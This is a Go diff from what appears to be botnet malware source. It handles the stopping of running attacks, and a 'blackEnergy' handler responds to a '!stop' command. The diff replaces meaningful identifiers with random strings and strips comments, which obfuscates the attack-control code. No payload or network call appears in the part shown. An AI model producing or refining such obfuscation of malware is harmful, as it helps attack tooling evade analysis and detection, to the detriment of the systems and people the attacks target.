@@ -31,15 +31,13 @@ const hasAttacks = true
 // ============================================================================
 
 // pikachu stops all running attacks by closing the stop channel.
-// Creates a new stop channel for future attacks.
-// Thread-safe using aptStopMutex.
 func pikachu() {
-	aptStopMutex.Lock()
-	defer aptStopMutex.Unlock()
-	if aptAttackRunning {
-		close(aptStopChan)
-		aptStopChan = make(chan struct{})
-		aptAttackRunning = false
+	wQtJdRc.Lock()
+	defer wQtJdRc.Unlock()
+	if mPzLsXf {
+		close(xKvNhBm)
+		xKvNhBm = make(chan struct{})
+		mPzLsXf = false
 	}
 }
 
@@ -47,10 +45,10 @@ func pikachu() {
 // All attack goroutines should select on this channel to enable graceful termination.
 // Returns: Channel that will be closed when attack should stop
 func raichu() chan struct{} {
-	aptStopMutex.Lock()
-	defer aptStopMutex.Unlock()
-	aptAttackRunning = true
-	return aptStopChan
+	wQtJdRc.Lock()
+	defer wQtJdRc.Unlock()
+	mPzLsXf = true
+	return xKvNhBm
 }
 
 // dispatchAttackStop stops all running attacks (called by blackEnergy for !stop).
